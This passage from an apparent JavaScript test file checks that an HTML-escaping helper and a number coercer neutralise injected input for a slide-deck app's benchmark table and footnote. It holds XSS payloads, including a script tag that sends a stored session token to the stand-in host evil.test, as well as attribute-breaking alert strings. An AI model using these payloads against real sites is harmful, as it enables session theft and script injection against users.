    '</span><script>fetch("//evil.test?"+localStorage.getItem("nateland-deck-session-v1"))<\/script>',
    '" onmouseover="alert(1)" x="',
    "' onfocus='alert(1)",
    '<svg/onload=alert(1)>'
  ];
  for (const p of payloads) {
    const out = escApi.esc(p);
    assert(!out.includes('<'), `no raw < in: ${out}`);
    assert(!out.includes('>'), `no raw > in: ${out}`);
    assert(!out.includes('"'), `no raw " in: ${out}`);
    assert(!out.includes("'"), `no raw ' in: ${out}`);
  }
});

await test('esc() leaves ordinary titles readable', () => {
  equal(escApi.esc('Costs & reserve'), 'Costs &amp; reserve');
  equal(escApi.esc('Economic projections'), 'Economic projections');
  equal(escApi.esc(''), '');
  equal(escApi.esc(null), '', 'a null title does not print "null"');
  equal(escApi.esc(undefined), '');
});

await test('esc() does not double-encode into nonsense', () => {
  /* Escaping twice is a bug of a different kind — the reader sees &amp;amp; —
     so make it visible if anyone adds a second pass upstream. */
  equal(escApi.esc(escApi.esc('&')), '&amp;amp;');
});

await test('num() refuses anything that is not a finite number', () => {
  equal(escApi.num(22), 22);
  equal(escApi.num('22'), 22);
  equal(escApi.num('22; alert(1)'), 0, 'an injected attribute value collapses to 0');
  equal(escApi.num(undefined), 0);
  equal(escApi.num(null), 0);
  equal(escApi.num(NaN), 0);
  equal(escApi.num(Infinity), 0);
  equal(escApi.num({}), 0);
});

await test('the benchmark rows actually route the server strings through esc/num', () => {
  /* A source-level tripwire. The unit tests above prove esc() works; this
     proves it is still being called at the sink, which is the part a future
     edit could quietly drop. */
  const from = html.indexOf('c.bench.top.map(function(t){');
  assert(from > 0, 'found the benchmark row template');
  const block = html.slice(from, from + 700);

  assert(/esc\(t\.title/.test(block), 'the title from /api/stats is escaped');
  assert(/num\(t\.slide\)|num\(t\.ms\)/.test(block), 'the numbers are coerced');
  assert(!/\+\s*t\.title/.test(block), 'no raw t.title concatenation remains');
});

await test('the footnote coerces the reader counts it prints', () => {
  const from = html.indexOf('Median read ');
  assert(from > 0, 'found the footnote');
  const block = html.slice(from, from + 400);
  assert(/num\(c\.bench\.medianTotalMs\)/.test(block), 'median coerced');
  assert(/num\(c\.bench\.viewers\)/.test(block), 'reader count coerced');
});

/* ---- done ---------------------------------------------------------- */
console.log(`\n${passed} passed, ${failures.length} failed\n`);

if (failures.length) {
  for (const { name, err } of failures) {
    console.log(`[31m${name}[0m`);
    console.log(err.stack ?? err.message);
    console.log('');
  }
  process.exit(1);
}
